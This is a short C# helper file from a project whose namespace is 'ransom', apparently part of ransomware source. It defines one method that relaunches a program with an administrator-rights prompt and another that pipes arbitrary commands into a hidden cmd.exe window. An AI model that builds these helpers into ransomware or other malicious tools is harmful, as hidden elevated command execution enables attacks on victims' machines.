using System.Diagnostics;

namespace ransom;

internal class ExecutionHelper
{
	public static void ExecuteAsAdmin(string fileName)
	{
		Process process = new Process();
		process.StartInfo.FileName = fileName;
		process.StartInfo.UseShellExecute = true;
		process.StartInfo.Verb = "runas";
		process.Start();
	}

	public static void ExecuteCmdCommand(string command)
	{
		Process process = new Process();
		process.StartInfo.FileName = "cmd.exe";
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.UseShellExecute = false;
		process.Start();
		process.StandardInput.WriteLine(command);
		process.StandardInput.Flush();
		process.StandardInput.Close();
		process.WaitForExit();
	}
}
